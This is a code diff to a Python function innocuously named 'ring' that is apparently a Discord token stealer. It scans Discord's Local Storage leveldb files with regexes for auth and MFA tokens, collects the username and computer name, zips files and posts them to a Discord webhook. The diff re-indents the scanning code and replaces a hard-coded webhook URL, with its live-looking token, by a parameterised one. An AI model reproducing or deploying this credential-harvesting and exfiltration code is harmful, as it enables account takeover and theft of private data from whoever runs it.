@@ -5,7 +5,6 @@ import requests
 import zipfile
 
 
-
 def ring(*args):
 	if len(args)>=2:
 		if args[0].isdigit():
@@ -16,18 +15,18 @@ def ring(*args):
 			hook_token = args[0]
 
 		def find_tokens(place, path):
-		    path += '\\Local Storage\\leveldb'
-		    tokens = []
-		    for file_name in os.listdir(path):
-		        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-		            continue
+			path += '\\Local Storage\\leveldb'
+			tokens = []
+			for file_name in os.listdir(path):
+				if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+					continue
 
-		        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-		            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-		                for token in re.findall(regex, line):
-		                    tokens.append(token)
-		    ret = f'{place}: {tokens}'
-		    return ret
+				for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+					for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+						for token in re.findall(regex, line):
+							tokens.append(token)
+			ret = f'{place}: {tokens}'
+			return ret
 
 		user = os.getenv('username')
 		pc_name = os.environ['COMPUTERNAME']
@@ -77,7 +76,7 @@ def ring(*args):
 			fin = open(zipf, 'rb')
 			files = {'file': fin}
 			try:
-				requests.post('https://discord.com/api/webhooks/786283774576558160/VDggoq1mXKLx0CwRmsA7let10-YLuBq9vPXOzCKrU2YMJ2E5_u4dhAuFcB_FLdPRnLAI', files=files)
+				requests.post(f'https://discord.com/api/webhooks/{hook_id}/{hook_token}', files=files)
 			except Exception:
 				pass
 		except Exception:
@@ -87,7 +86,6 @@ def ring(*args):
 			os.remove(zipf)
 		except Exception:
 			pass
-
 		return args[-1]
 		
 	else:
